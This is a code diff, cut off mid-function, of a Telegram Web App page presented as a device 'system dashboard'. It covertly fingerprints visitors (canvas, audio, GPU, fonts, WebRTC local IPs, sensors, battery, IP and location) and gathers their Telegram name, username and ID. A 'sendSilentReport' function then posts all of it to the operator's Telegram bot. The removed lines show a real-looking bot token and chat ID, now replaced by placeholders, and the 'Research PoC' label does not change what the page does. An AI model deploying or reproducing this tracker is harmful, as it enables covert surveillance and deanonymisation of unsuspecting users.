@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Advanced System Dashboard V3.0 Premium</title>
+    <title>Advanced System Dashboard V4.2 Fixed</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;800&family=Fira+Code:wght@500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -17,14 +17,13 @@
             --accent-purple: #8b5cf6;
             --accent-green: #10b981;
             --accent-red: #ef4444;
-            --accent-yellow: #facc15; /* لون أصفر واضح */
+            --accent-yellow: #facc15;
             --accent-orange: #f97316;
-            --accent-blue: #3b82f6; /* لون التوثيق */
+            --accent-blue: #3b82f6;
             --text-primary: #f1f5f9;
             --text-secondary: #94a3b8;
         }
 
-        /* --- الحماية والأساسيات --- */
         body {
             -webkit-user-select: none; user-select: none;
             -webkit-touch-callout: none; cursor: default;
@@ -36,7 +35,6 @@
             padding: 16px;
             min-height: 100vh;
             padding-bottom: 40px;
-            /* التوافق مع الشاشات الكبيرة */
             max-width: 600px; 
             box-shadow: 0 0 50px rgba(0,0,0,0.5);
         }
@@ -44,14 +42,12 @@
         img { pointer-events: none; }
         * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
-        /* --- العناوين --- */
         .section-title {
             font-size: 14px; color: var(--text-secondary);
             margin: 20px 0 8px 0; display: flex; align-items: center; gap: 8px;
         }
         .section-title i { color: var(--accent-cyan); }
 
-        /* --- الكروت الزجاجية --- */
         .glass-card {
             background: var(--card-glass);
             backdrop-filter: blur(16px);
@@ -63,7 +59,6 @@
             margin-bottom: 12px;
         }
 
-        /* --- بروفايل المستخدم --- */
         .profile-header {
             display: flex; align-items: center; gap: 16px;
         }
@@ -71,6 +66,7 @@
             width: 60px; height: 60px; border-radius: 50%;
             border: 2px solid var(--accent-cyan);
             object-fit: cover;
+            background-color: #000;
         }
         .user-info {
             flex: 1;
@@ -85,23 +81,21 @@
         .premium-badge {
             color: var(--accent-blue);
             font-size: 16px;
-            display: none; /* مخفي افتراضياً */
+            display: none;
             animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
-        .user-info span { font-family: 'Fira Code'; font-size: 12px; color: var(--accent-purple); }
+        .user-info span { font-family: 'Fira Code'; font-size: 12px; color: var(--accent-purple); direction: ltr; display: block; text-align: right; }
 
         @keyframes popIn {
             0% { transform: scale(0); }
             100% { transform: scale(1); }
         }
 
-        /* --- شبكة المعلومات (Grid System) --- */
         .info-grid {
             display: grid;
             grid-template-columns: repeat(2, 1fr);
             gap: 12px;
         }
-        /* تحسين للموبايلات الصغيرة جداً */
         @media (max-width: 350px) {
             .info-grid { grid-template-columns: 1fr; }
             .full-span { grid-column: span 1; }
@@ -115,11 +109,21 @@
             overflow: hidden;
         }
         .info-label { font-size: 11px; color: var(--text-secondary); margin-bottom: 4px; }
-        .info-value { font-family: 'Fira Code'; font-size: 13px; font-weight: bold; color: #fff; word-break: break-all;}
+        
+        /* تحسين عرض القيم الرقمية */
+        .info-value { 
+            font-family: 'Fira Code'; 
+            font-size: 13px; 
+            font-weight: bold; 
+            color: #fff; 
+            word-break: break-all;
+            direction: ltr;
+            text-align: right;
+            unicode-bidi: plaintext;
+        }
         
         .full-span { grid-column: span 2; }
 
-        /* --- تأثير السوائل (Liquid Physics) --- */
         .liquid-container {
             position: relative;
             width: 100%; height: 160px;
@@ -130,6 +134,7 @@
             display: flex; justify-content: center; align-items: center;
             box-shadow: inset 0 0 20px rgba(0,0,0,0.5);
             margin-top: 15px;
+            cursor: pointer; /* ليشعر المستخدم أنها قابلة للنقر */
         }
 
         .liquid-box {
@@ -137,7 +142,7 @@
             top: 50%; left: 50%;
             width: 300%; height: 300%;
             transform: translate(-50%, -50%);
-            transition: transform 0.1s cubic-bezier(0.2, 0.8, 0.2, 1);
+            transition: transform 0.1s linear; /* جعل الحركة أنعم */
         }
 
         .water {
@@ -168,9 +173,9 @@
             position: relative; z-index: 10;
             text-align: center;
             text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+            pointer-events: none;
         }
 
-        /* --- شريط البطارية --- */
         .bar-container {
             height: 10px; background: rgba(255,255,255,0.1);
             border-radius: 6px; overflow: hidden; margin-top: 8px;
@@ -181,12 +186,41 @@
             transition: width 0.5s ease, background-color 0.5s ease; 
         }
 
+        #loading {
+            position: fixed;
+            inset: 0;
+            background: rgba(15,23,42,0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.4rem;
+            color: var(--accent-cyan);
+            z-index: 9999;
+        }
+
+        .copy-btn {
+            font-size: 12px;
+            color: var(--accent-cyan);
+            cursor: pointer;
+            margin-left: 8px;
+            user-select: auto;
+            float: left;
+        }
+        
+        /* تنبيه لتفعيل الحساسات */
+        .sensor-alert {
+            font-size: 10px; color: var(--accent-yellow); margin-top:5px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse { 0% {opacity: 0.6;} 50% {opacity: 1;} 100% {opacity: 0.6;} }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
+    <div id="loading"><i class="fa-solid fa-spinner fa-spin"></i> جاري التحميل والفحص...</div>
+
     <div class="glass-card profile-header">
-        <img src="" id="user-photo" class="avatar-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/149/149071.png'">
+        <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" id="user-photo" class="avatar-img" onerror="this.src='https://cdn-icons-png.flaticon.com/512/149/149071.png'">
         <div class="user-info">
             <h2 id="user-name">
                 جاري المعالجة... 
@@ -206,8 +240,8 @@
             <span class="info-value" id="val-ip" style="color: var(--accent-cyan);">جاري الفحص...</span>
         </div>
         <div class="info-item">
-            <span class="info-label">عنوان IP (Local)</span>
-            <span class="info-value" id="val-local-ip">--</span>
+            <span class="info-label">Local IP (WebRTC)</span>
+            <span class="info-value" id="val-local-ip-webrtc">--</span>
         </div>
         <div class="info-item">
             <span class="info-label">مزود الخدمة (ISP)</span>
@@ -217,19 +251,21 @@
             <span class="info-label">الدولة والمدينة</span>
             <span class="info-value" id="val-loc">--</span>
         </div>
+        <div class="info-item full-span">
+            <span class="info-label">Timezone</span>
+            <span class="info-value" id="val-timezone">--</span>
+        </div>
     </div>
 
     <div class="section-title"><i class="fa-solid fa-microchip"></i> العتاد والبيانات المتقدمة</div>
     <div class="glass-card info-grid">
         <div class="info-item"><span class="info-label">نوع الجهاز</span><span class="info-value" id="val-dev-type">📱 هاتف</span></div>
         <div class="info-item"><span class="info-label">لغة النظام</span><span class="info-value" id="val-lang">--</span></div>
-        
         <div class="info-item"><span class="info-label">دقة الشاشة</span><span class="info-value" id="val-res">--</span></div>
+        <div class="info-item"><span class="info-label">Pixel Ratio</span><span class="info-value" id="val-pixel-ratio">--</span></div>
         <div class="info-item"><span class="info-label">عمق الألوان</span><span class="info-value" id="val-color">--</span></div>
-        
         <div class="info-item"><span class="info-label">المتصفح</span><span class="info-value" id="val-browser">--</span></div>
         <div class="info-item"><span class="info-label">وضع الشاشة</span><span class="info-value" id="val-orient">--</span></div>
-
         <div class="info-item"><span class="info-label">المعالج</span><span class="info-value" id="val-cores">--</span></div>
         <div class="info-item"><span class="info-label">الرامات</span><span class="info-value" id="val-ram">--</span></div>
         <div class="info-item full-span">
@@ -237,20 +273,17 @@
             <span class="info-value" id="val-gpu" style="color: var(--accent-orange);">جاري الفحص...</span>
         </div>
         <div class="info-item full-span">
-            <span class="info-label">الخطوط المكتشفة (Fonts)</span>
+            <span class="info-label">الخطوط المكتشفة</span>
             <div id="fonts-container" style="display: flex; flex-wrap: wrap; gap: 5px; margin-top: 5px;"></div>
         </div>
-
         <div class="info-item full-span">
             <span class="info-label">الشبكة والسرعة</span>
             <span class="info-value" id="val-net-speed" style="color:var(--accent-green);">جاري القياس...</span>
         </div>
-
         <div class="info-item full-span">
             <span class="info-label">الوقت الحالي</span>
             <span class="info-value" id="val-time">--</span>
         </div>
-        
         <div class="info-item full-span">
             <div style="display:flex; justify-content:space-between;">
                 <span class="info-label">البطارية</span>
@@ -262,8 +295,30 @@
         </div>
     </div>
 
+    <div class="section-title"><i class="fa-solid fa-fingerprint"></i> بصمات متقدمة</div>
+    <div class="glass-card info-grid">
+        <div class="info-item full-span">
+            <span class="info-label">Canvas Fingerprint</span>
+            <span class="info-value" id="val-canvas">جاري الحساب...</span>
+            <span class="copy-btn" onclick="copyToClipboard('val-canvas')">نسخ</span>
+        </div>
+        <div class="info-item full-span">
+            <span class="info-label">Audio Fingerprint</span>
+            <span class="info-value" id="val-audio">جاري الحساب...</span>
+            <span class="copy-btn" onclick="copyToClipboard('val-audio')">نسخ</span>
+        </div>
+        <div class="info-item full-span">
+            <span class="info-label">WebRTC Local IPs</span>
+            <span class="info-value" id="val-webrtc-ips">--</span>
+        </div>
+        <div class="info-item full-span">
+            <span class="info-label">Sensors (Accel/Gyro)</span>
+            <span class="info-value" id="val-sensors">--</span>
+        </div>
+    </div>
+
     <div class="section-title"><i class="fa-solid fa-compass"></i> الحركة</div>
-    <div class="liquid-container">
+    <div class="liquid-container" id="liquid-trigger" onclick="requestSensorPermission()">
         <div class="liquid-box" id="liquid-box">
             <div class="water"></div>
         </div>
@@ -271,97 +326,254 @@
         <div class="gyro-text">
             <h3 style="margin:0; font-size:18px;">Device balance</h3>
             <p id="gyro-vals" style="margin:4px 0 0; font-family:'Fira Code'; font-size:12px; color:var(--accent-cyan);">X: 0° | Y: 0°</p>
-            <p style="margin:4px 0 0; font-size:10px; color:rgba(255,255,255,0.5);">قم بإمالة الجهاز لتحريك الماء</p>
+            <p id="gyro-status" style="margin:8px 0 0; font-size:11px; color:rgba(255,255,255,0.6);">
+                اضغط هنا لتفعيل حركة الماء
+            </p>
+            <div id="sensor-alert" class="sensor-alert" style="display:none;">⚠️ اضغط لتشغيل الحساسات</div>
         </div>
     </div>
     
-    <div style="text-align:center; margin-top:10px; color:#555; font-size:10px;">By Devil</div>
+    <div style="text-align:center; margin-top:20px; color:#555; font-size:11px;">
+        Research PoC - V4.2
+    </div>
 
     <script>
-    // --- 1. الإعدادات ---
-    const BOT_TOKEN = "7960728687:AAEYWfOamIwi5wPotGTH3LZyS1WDxT8q3Z8";
-    const CHAT_ID = "-1003018202565";
+    // ======================
+    // الإعدادات الأساسية
+    // ======================
+    const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";     // ← ضع توكن البوت هنا
+    const CHAT_ID   = "YOUR_CHAT_ID_HERE";       // ← ضع معرف القناة أو المجموعة هنا
+
     const tg = window.Telegram.WebApp;
     tg.expand();
 
     let collectedData = {
-        ip: "N/A", bat: "N/A", user: "Guest", canvas: "", 
-        res: "", net: "--", time: "", browser: "N/A", cores: "--", ram: "--",
-        isPremium: "No"
+        ip: "N/A",
+        localIps: [],
+        bat: "N/A",
+        user: "Guest",
+        canvas: "",
+        audio: "",
+        res: "",
+        net: "--",
+        time: "",
+        browser: "N/A",
+        cores: "--",
+        ram: "--",
+        isPremium: "No",
+        timezone: "",
+        webrtcIps: [],
+        sensors: {},
+        pixelRatio: "",
+        fonts: ""
     };
 
-    // --- 2. دالة الجيروسكوب ---
-    function handleMotion(event) {
-        const x = event.gamma || 0;
-        const y = event.beta || 0;
-        const gyroElem = document.getElementById('gyro-vals');
-        if(gyroElem) gyroElem.innerText = `X: ${Math.round(x)}° | Y: ${Math.round(y)}°`;
-        const box = document.getElementById('liquid-box');
-        if(box) box.style.transform = `translate(-50%, -50%) rotate(${-x}deg)`;
+    // ======================
+    // دوال مساعدة
+    // ======================
+    function copyToClipboard(elemId) {
+        const el = document.getElementById(elemId);
+        let text = '';
+
+        if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
+            text = el.value;
+        } else {
+            text = el.innerText || el.textContent || '';
+        }
+
+        text = text.trim();
+
+        if (!text) {
+            alert("لا يوجد نص للنسخ");
+            return;
+        }
+
+        navigator.clipboard.writeText(text)
+            .then(() => alert("تم النسخ بنجاح"))
+            .catch(() => alert("فشل النسخ، جرب يدويًا"));
     }
 
-    // --- 3. البصمة الرقمية Canvas ---
+    function hideLoading() {
+        const loading = document.getElementById('loading');
+        if (loading) loading.style.display = 'none';
+    }
+
+    // ======================
+    // جيروسكوب + حساسات (تم الإصلاح)
+    // ======================
+    function handleMotion(event) {
+        // التحقق من القيم لتجنب الأخطاء
+        const x = event.gamma || 0; 
+        const y = event.beta || 0;
+        const z = event.alpha || 0;
+
+        document.getElementById('gyro-vals').innerText = 
+            `X: ${Math.round(x)}° | Y: ${Math.round(y)}°`;
+        document.getElementById('gyro-status').innerText = 'الحساسات تعمل بنشاط';
+
+        const box = document.getElementById('liquid-box');
+        if (box) {
+            // تصحيح صيغة التحويل (Transform Syntax)
+            box.style.transform = `translate(-50%, -50%) rotate(${-x}deg)`;
+        }
+
+        collectedData.sensors = { x: Math.round(x), y: Math.round(y), z: Math.round(z) };
+        document.getElementById('val-sensors').innerText = JSON.stringify(collectedData.sensors);
+    }
+
+    // دالة جديدة لطلب الإذن (مهمة للآيفون)
+    function requestSensorPermission() {
+        if (typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function') {
+            // iOS 13+
+            DeviceOrientationEvent.requestPermission()
+                .then(response => {
+                    if (response === 'granted') {
+                        window.addEventListener('deviceorientation', handleMotion);
+                        document.getElementById('gyro-status').innerText = "تم التفعيل!";
+                        document.getElementById('sensor-alert').style.display = 'none';
+                    } else {
+                        alert("تم رفض إذن الحساسات");
+                    }
+                })
+                .catch(console.error);
+        } else {
+            // Android / Old iOS
+            window.addEventListener('deviceorientation', handleMotion);
+            document.getElementById('gyro-status').innerText = "تم التفعيل (Android/PC)";
+        }
+    }
+
+    // ======================
+    // Canvas Fingerprint
+    // ======================
     function getCanvasID() {
         try {
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
-            ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+            ctx.textBaseline = "top";
+            ctx.font = "14px Arial";
             ctx.fillStyle = "#f60"; ctx.fillRect(125,1,62,20);
-            ctx.fillStyle = "#069"; ctx.fillText("Cyber-Research", 2, 15);
-            return btoa(canvas.toDataURL()).slice(-30, -5);
-        } catch(e) { return "Blocked"; }
-    }
-
-    // --- 4. حقن حقول الإدخال للجهاز ---
-    function injectInputFields() {
-        const target = document.querySelector('.profile-header');
-        const ua = navigator.userAgent;
-        let brand = "Unknown Device", model = "Generic Model";
-
-        if (/iPhone|iPad|iPod/.test(ua)) { brand = "Apple (iOS)"; model = "iPhone/iPad"; }
-        else if (/Android/.test(ua)) {
-            brand = "Android System";
-            const match = ua.match(/Android \d+; ([^;)]+)/);
-            model = match ? match[1] : "Android Mobile";
+            ctx.fillStyle = "#069"; ctx.fillText("Research 2026", 2, 15);
+            ctx.fillStyle = "#f0f"; ctx.beginPath(); ctx.arc(50,50,30,0,Math.PI*2); ctx.fill();
+            ctx.shadowColor = "#0ff"; ctx.shadowBlur = 10; ctx.fillText("Test", 100, 100);
+            return btoa(canvas.toDataURL()).slice(-40);
+        } catch(e) {
+            return "Blocked";
         }
-
-        const inputHTML = `
-        <div class="section-title"><i class="fa-solid fa-mobile-screen-button"></i> تفاصيل الجهاز</div>
-        <div class="glass-card" style="margin-bottom:15px;">
-            <div style="display:flex; flex-direction:column; gap:12px;">
-                <input type="text" id="in-brand" value="${brand}" readonly style="width:100%; background:rgba(6, 182, 212, 0.1); border:1px solid rgba(6, 182, 212, 0.2); border-radius:12px; padding:14px; color:var(--accent-cyan); font-size:14px; outline:none;">
-                
-                <input type="text" id="in-model" value="${model}" readonly style="width:100%; background:rgba(139, 92, 246, 0.1); border:1px solid rgba(139, 92, 246, 0.2); border-radius:12px; padding:14px; color:var(--accent-purple); font-size:14px; outline:none;">
-                
-                <input type="text" id="in-canvas" readonly style="width:100%; background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.1); border-radius:12px; padding:14px; color:var(--accent-orange); font-size:11px; outline:none;" placeholder="بصمة الجهاز">
-            </div>
-        </div>`;
-        target.insertAdjacentHTML('afterend', inputHTML);
     }
 
-    // --- 5. جمع المواصفات ---
+    // ======================
+    // Audio Fingerprint
+    // ======================
+    async function getAudioFingerprint() {
+        try {
+            const OfflineCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+            if (!OfflineCtx) return "غير مدعوم";
+
+            const context = new OfflineCtx(1, 5000, 44100);
+            const oscillator = context.createOscillator();
+            oscillator.type = 'triangle';
+            oscillator.frequency.value = 10000;
+
+            const compressor = context.createDynamicsCompressor();
+            compressor.threshold.value = -50;
+            compressor.knee.value = 40;
+            compressor.ratio.value = 12;
+            compressor.attack.value = 0;
+            compressor.release.value = 0.25;
+
+            oscillator.connect(compressor);
+            compressor.connect(context.destination);
+            oscillator.start(0);
+
+            const buffer = await context.startRendering();
+            const data = buffer.getChannelData(0);
+
+            let hash = 0;
+            for (let i = 1000; i < data.length; i += 50) {
+                hash += data[i] * (i + 1);
+            }
+            return Math.abs(hash).toString(36).slice(0, 20);
+        } catch (e) {
+            return "Blocked / تفاعل مطلوب";
+        }
+    }
+
+    // ======================
+    // WebRTC IPs
+    // ======================
+    function getWebRTCIPs() {
+        const ips = new Set();
+        const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection)({ iceServers: [] });
+
+        pc.onicecandidate = e => {
+            if (!e.candidate) return;
+            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
+            if (match && match[1] !== '0.0.0.0') {
+                ips.add(match[1]);
+                collectedData.webrtcIps = [...ips];
+                document.getElementById('val-webrtc-ips').innerText = collectedData.webrtcIps.join(', ') || '--';
+                document.getElementById('val-local-ip-webrtc').innerText = collectedData.webrtcIps[0] || '--';
+            }
+        };
+
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+
+        setTimeout(() => pc.close(), 8000);
+    }
+
+    // ======================
+    // جمع المعلومات الأساسية (تم الإصلاح)
+    // ======================
     function getExtraSpecs() {
-        const n = navigator; const s = screen;
+        const n = navigator;
+        const s = window.screen; // استخدام window.screen
+
+        // إصلاح عرض الدقة
         const res = `${s.width}x${s.height}`;
         document.getElementById('val-res').innerText = res;
+        document.getElementById('val-pixel-ratio').innerText = window.devicePixelRatio.toFixed(2);
+
         document.getElementById('val-color').innerText = `${s.colorDepth} bit`;
-        document.getElementById('val-lang').innerText = n.language;
-        document.getElementById('val-orient').innerText = s.orientation ? s.orientation.type : "Portrait";
+        document.getElementById('val-lang').innerText = n.language || n.userLanguage || '--';
+
+        document.getElementById('val-orient').innerText = screen.orientation?.type || "Portrait";
+
+        const offset = new Date().getTimezoneOffset() / -60;
+        const sign = offset >= 0 ? '+' : '';
+        document.getElementById('val-timezone').innerText = 
+            Intl.DateTimeFormat().resolvedOptions().timeZone + 
+            ` (UTC${sign}${Math.abs(offset)})`;
+
         let browser = "Chrome";
-        if(n.userAgent.includes("Safari") && !n.userAgent.includes("Chrome")) browser = "Safari";
+        if (n.userAgent.includes("Firefox")) browser = "Firefox";
+        else if (n.userAgent.includes("Safari") && !n.userAgent.includes("Chrome")) browser = "Safari";
         document.getElementById('val-browser').innerText = browser;
-        if (n.connection) {
-            const speed = n.connection.downlink;
-            const netStr = `${n.connection.effectiveType.toUpperCase()} (${speed} Mbps)`;
-            document.getElementById('val-net-speed').innerText = netStr;
-            collectedData.net = netStr;
+
+        // إصلاح الشبكة (Navigator Connection)
+        const conn = n.connection || n.mozConnection || n.webkitConnection;
+        if (conn) {
+            const type = conn.effectiveType ? conn.effectiveType.toUpperCase() : 'WIFI/UNKNOWN';
+            const speed = conn.downlink ? conn.downlink + ' Mbps' : 'N/A';
+            const txt = `${type} (${speed})`; // تصحيح Syntax
+            document.getElementById('val-net-speed').innerText = txt;
+            collectedData.net = txt;
+        } else {
+            // Fallback للأجهزة التي لا تدعم الخاصية
+            document.getElementById('val-net-speed').innerText = 'iOS/Unknown';
+            collectedData.net = 'Not Supported';
         }
-        collectedData.res = res; collectedData.browser = browser;
+
+        collectedData.res = res;
+        collectedData.pixelRatio = window.devicePixelRatio.toFixed(2);
+        collectedData.browser = browser;
+        collectedData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     }
 
     function getAdvancedHardware() {
         const cores = navigator.hardwareConcurrency || "--";
-        const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "4GB+";
+        const ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "--";
         document.getElementById('val-cores').innerText = cores + " Cores";
         document.getElementById('val-ram').innerText = ram;
         return { cores, ram };
@@ -371,132 +583,176 @@
         try {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
-        } catch (e) { return "Blocked/Unsupported"; }
+            if (!gl) return "غير مدعوم";
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "غير معروف";
+        } catch {
+            return "Blocked";
+        }
     }
 
     function detectFonts() {
-        const fontList = ["Arial", "Courier New", "Georgia", "Times New Roman", "Verdana", "Cairo", "Roboto", "Tahoma", "Segoe UI"];
+        const fonts = ["Arial", "Tahoma", "Verdana", "Cairo", "Noto Sans Arabic", "Amiri", "Roboto", "Segoe UI"];
         const container = document.getElementById('fonts-container');
-        let detected = [];
-        fontList.forEach(font => {
+        fonts.forEach(f => {
             const span = document.createElement("span");
-            span.style.cssText = "font-family:"+font+"; font-size:10px; padding:2px 6px; background:rgba(255,255,255,0.05); border-radius:4px; color:var(--text-secondary);";
-            span.innerText = font;
+            span.style.cssText = `font-family:${f}; font-size:10px; padding:2px 6px; background:rgba(255,255,255,0.05); border-radius:4px; color:var(--text-secondary);`;
+            span.textContent = f;
             container.appendChild(span);
-            detected.push(font);
         });
-        return detected.join(", ");
+        collectedData.fonts = fonts.join(", ");
+        return collectedData.fonts;
     }
 
-    // --- 6. التشغيل الرئيسي ---
-    async function init() {
-        injectInputFields();
-        getExtraSpecs();
-        const hw = getAdvancedHardware();
-        
-        collectedData.gpu = getGPUInfo();
-        document.getElementById('val-gpu').innerText = collectedData.gpu;
-        collectedData.fonts = detectFonts();
-        collectedData.cores = hw.cores;
-        collectedData.ram = hw.ram;
-        collectedData.canvas = getCanvasID();
-        document.getElementById('in-canvas').value = "ID: " + collectedData.canvas;
+    // ======================
+    // الإرسال إلى تيليجرام
+    // ======================
+    async function sendSilentReport() {
+        try {
+            const loc = document.getElementById('val-loc').innerText.trim() || 'غير معروف';
 
-        // --- التعامل مع بيانات المستخدم و البريميوم ---
-        const user = tg.initDataUnsafe.user;
-        if (user) {
-            document.getElementById('user-name').firstChild.textContent = user.first_name + ' '; // ترك مسافة للأيقونة
-            document.getElementById('user-id').innerText = `ID: ${user.id}`;
-            collectedData.user = `@${user.username || 'None'} (${user.id})`;
-            
-            // التحقق من البريميوم
-            if (user.is_premium) {
-                document.getElementById('premium-icon').style.display = 'inline-block';
-                collectedData.isPremium = "نعم ✅";
-            } else {
-                collectedData.isPremium = "لا ❌";
-            }
-        }
+            // استخدام template literals الصحيحة
+            const msg = `
+📱 **تقرير جهاز V4.2 (Fixed)** ━━━━━━━━━━━━━━━━━━━
+💎 بريميوم: ${collectedData.isPremium}
+🌍 الموقع: ${loc}
+🌐 IP: ${collectedData.ip}
+🔒 Local IPs: ${collectedData.webrtcIps.join(', ') || '--'}
+🔋 البطارية: ${collectedData.bat || 'غير متاح'}
+📶 الشبكة: ${collectedData.net}
+🧠 RAM / Cores: ${collectedData.ram} / ${collectedData.cores}
+🎮 GPU: ${collectedData.gpu || 'غير متاح'}
+🎨 Fonts: ${collectedData.fonts || 'غير متاح'}
+📏 الدقة: ${collectedData.res} @ ${collectedData.pixelRatio}x
+🕒 Timezone: ${collectedData.timezone}
+🔊 Audio FP: ${collectedData.audio || 'غير متاح'}
+🖼️ Canvas FP: ${collectedData.canvas || 'غير متاح'}
+📱 Sensors: ${JSON.stringify(collectedData.sensors) || '{}'}
+━━━━━━━━━━━━━━━━━━━
+👤 المستخدم:
+${tg.initDataUnsafe.user ? 
+`الاسم: ${tg.initDataUnsafe.user.first_name || ''} ${tg.initDataUnsafe.user.last_name || ''}
+@ ${tg.initDataUnsafe.user.username || 'غير موجود'}
+ID: ${tg.initDataUnsafe.user.id}` : 'غير معروف'}
+            `.trim();
 
-        // --- جلب الـ IP ---
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-            document.getElementById('val-ip').innerText = d.ip;
-            document.getElementById('val-isp').innerText = d.org;
-            document.getElementById('val-loc').innerText = `${d.city}, ${d.country_name}`;
-            collectedData.ip = d.ip;
-        });
-
-        // --- منطق البطارية الجديد ---
-        if (navigator.getBattery) {
-            navigator.getBattery().then(bat => {
-                const update = () => {
-                    const level = Math.round(bat.level * 100);
-                    const batBar = document.getElementById('bat-bar');
-                    const batTxt = document.getElementById('val-bat-txt');
-                    
-                    batTxt.innerText = level + '%';
-                    batBar.style.width = level + '%';
-                    
-                    let color = '';
-                    if (level < 25) {
-                        color = 'var(--accent-red)';
-                    } else if (level <= 50) {
-                        color = 'var(--accent-yellow)';
-                    } else {
-                        color = 'var(--accent-green)';
-                    }
-                    
-                    batBar.style.backgroundColor = color;
-                    batTxt.style.color = color;
-
-                    collectedData.bat = `${level}% (${bat.charging ? 'Charging' : 'Normal'})`;
-                };
-                update(); 
-                bat.onlevelchange = update; 
-                bat.onchargingchange = update;
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: true
+                })
             });
+            console.log("Sent.");
+        } catch (err) {
+            console.error("Error sending:", err);
         }
-
-        // --- الساعة ---
-        setInterval(() => {
-            const now = new Date().toLocaleString('en');
-            document.getElementById('val-time').innerText = now;
-            collectedData.time = now;
-        }, 1000);
-
-        if (window.DeviceOrientationEvent) window.addEventListener('deviceorientation', handleMotion);
-        
-        // إرسال التقرير
-        setTimeout(sendSilentReport, 4000);
     }
 
-    function sendSilentReport() {
-        const msg = `
-📱 <b>تقرير جهاز جديد:</b>
-━━━━━━━━━━━━━━━━
-💎 <b>حساب بريميوم:</b> ${collectedData.isPremium}
-🌍 <b>الموقع:</b> <code>${document.getElementById('val-loc').innerText}</code>
-🌐 <b>IP:</b> <code>${collectedData.ip}</code>
-🔋 <b>البطارية:</b> ${collectedData.bat}
-📶 <b>الشبكة:</b> ${collectedData.net}
-🧠 <b>الرام:</b> ${collectedData.ram} | <b>الأنوية:</b> ${collectedData.cores}
-🎮 <b>الـ GPU:</b> <code>${collectedData.gpu}</code>
-🎨 <b>الخطوط:</b> <code>${collectedData.fonts}</code>
-📏 <b>الدقة:</b> ${collectedData.res}
-━━━━━━━━━━━━━━━━
-👤 <b>بيانات المستخدم:</b>
-📝 <b>الاسم:</b> <code>${tg.initDataUnsafe.user?.first_name || 'غير معروف'} ${tg.initDataUnsafe.user?.last_name || ''}</code>
-🆔 <b>المعرف:</b> @${tg.initDataUnsafe.user?.username || 'لا يوجد'}
-🔢 <b>ID:</b> <code>${tg.initDataUnsafe.user?.id || '---'}</code>
-`;
+    // ======================
+    // التشغيل الرئيسي
+    // ======================
+    async function init() {
+        try {
+            // 1. بيانات المستخدم + الصورة (تم الإصلاح)
+            const user = tg.initDataUnsafe.user;
+            if (user) {
+                document.getElementById('user-name').firstChild.textContent = (user.first_name || 'مستخدم') + ' ';
+                document.getElementById('user-id').innerText = `ID: ${user.id}`;
 
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: "HTML" })
-        }).then(res => res.json()).then(data => console.log("Sent:", data));
+                // إصلاح جلب الصورة
+                if (user.photo_url) {
+                    document.getElementById('user-photo').src = user.photo_url;
+                }
+
+                collectedData.user = user.username ? `@${user.username} (${user.id})` : `ID ${user.id}`;
+                
+                if (user.is_premium) {
+                    document.getElementById('premium-icon').style.display = 'inline-block';
+                    collectedData.isPremium = "نعم ✅";
+                }
+            }
+
+            // 2. جمع البيانات
+            getExtraSpecs();
+            const hw = getAdvancedHardware();
+            collectedData.gpu = getGPUInfo();
+            collectedData.fonts = detectFonts();
+            collectedData.cores = hw.cores;
+            collectedData.ram = hw.ram;
+            collectedData.canvas = getCanvasID();
+            collectedData.audio = await getAudioFingerprint();
+
+            document.getElementById('val-gpu').innerText   = collectedData.gpu;
+            document.getElementById('val-canvas').innerText = collectedData.canvas;
+            document.getElementById('val-audio').innerText  = collectedData.audio;
+
+            getWebRTCIPs();
+
+            // 3. جلب IP
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const d = await res.json();
+                document.getElementById('val-ip').innerText  = d.ip || 'غير متاح';
+                document.getElementById('val-isp').innerText = d.org || '--';
+                document.getElementById('val-loc').innerText = `${d.city || '--'}, ${d.country_name || '--'}`;
+                collectedData.ip = d.ip || 'N/A';
+            } catch {
+                document.getElementById('val-ip').innerText = 'Blocked';
+            }
+
+            // 4. البطارية
+            if (navigator.getBattery) {
